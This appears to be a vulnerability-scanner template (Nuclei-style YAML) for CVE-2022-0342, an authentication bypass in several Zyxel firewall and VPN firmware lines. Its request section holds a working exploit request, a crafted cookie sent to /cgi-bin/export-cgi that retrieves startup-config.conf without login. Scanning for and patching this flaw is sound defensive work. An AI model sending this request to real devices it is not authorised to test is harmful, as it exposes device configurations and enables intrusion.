id: CVE-2022-0342

info:
  name: Zyxel- Authentication Bypass
  author: Powerexploit
  severity: high
  description: An authentication bypass vulnerability in the CGI program of Zyxel USG/ZyWALL series firmware versions 4.20 through 4.70, USG FLEX series firmware versions 4.50 through 5.20, ATP series firmware versions 4.32 through 5.20, VPN series firmware versions 4.30 through 5.20, and NSG series firmware versions V1.20 through V1.33 Patch 4, which could allow an attacker to bypass the web authentication and obtain administrative access of the device.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0342
    - https://security.humanativaspa.it/zyxel-authentication-bypass-patch-analysis-cve-2022-0342/
  classification:
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0342
    cwe-id: CWE-287
  tags: cve,cve2022,zyxel,auth-bypass

requests:
  - raw:
      - |
        GET /cgi-bin/export-cgi?category&argO=startup-config.conf HTTP/1.1
        Host: {{Hostname}}:8008
        Cookie: authtok=AAAAAAAA; secuRtBannerClsCookie=login

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Firmware Version"
        condition: and

      - type: status
        status:
          - 200
